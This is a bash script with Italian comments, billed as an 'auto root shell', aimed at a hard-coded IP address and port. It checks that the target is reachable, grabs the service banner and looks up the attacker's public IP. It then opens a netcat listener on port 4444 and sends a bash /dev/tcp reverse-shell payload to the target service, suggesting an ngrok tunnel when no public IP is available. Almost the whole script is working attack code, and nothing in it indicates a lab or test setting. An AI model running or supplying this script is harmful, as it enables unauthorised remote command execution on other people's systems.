#!/bin/bash
# 🔥 AUTO ROOT SHELL - DEBUG + FIX Connection Refused
# Test servizio + Multi-payload + IP check

TARGET_IP="63.164.100.214"
TARGET_PORT="9091"

clear
echo "🔍 DEBUG + AUTO ROOT SHELL"
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "════════════════════════════"

# 1. TEST CONNESSIONE
echo "[+] Test TCP..."
timeout 3 nc -zv $TARGET_IP $TARGET_PORT 2>&1 | grep "succeeded" && echo "✅ TCP OK" || echo "❌ TCP DEAD"

# 2. CAPTA SERVIZIO
echo -e "\n[+] Scopro servizio..."
timeout 5 nc $TARGET_IP $TARGET_PORT | head -10 || echo "No banner"

# 3. IP PUBBLICO
MY_IP=$(curl -s ifconfig.me 2>/dev/null || curl -s ident.me 2>/dev/null || curl -s icanhazip.com 2>/dev/null || echo "NO_IP")
echo "IP pubblico: $MY_IP"

if [[ "$MY_IP" == "NO_IP" ]]; then
    echo "❌ NO IP PUBBLICO - Usa tunnel:"
    echo "ngrok tcp 4444  # Poi sostituisci MY_IP"
    exit 1
fi

PORT=4444

# 4. REVERSE SHELL SEMPLICE (NO PYTHON ERROR)
echo -e "\n🚀 Avvio listener..."
nc -lvnp $PORT &
sleep 2

echo -e "\n📤 INVIO BASh SHELL..."
echo "bash -c 'bash -i >& /dev/tcp/$MY_IP/$PORT 0>&1'" | nc -w5 $TARGET_IP $TARGET_PORT

echo -e "\n🔥 Shell pronta! (Ctrl+C per uscire)"
echo "═══════════════════════════════════════"

# Attendi
nc -lvnp $PORT
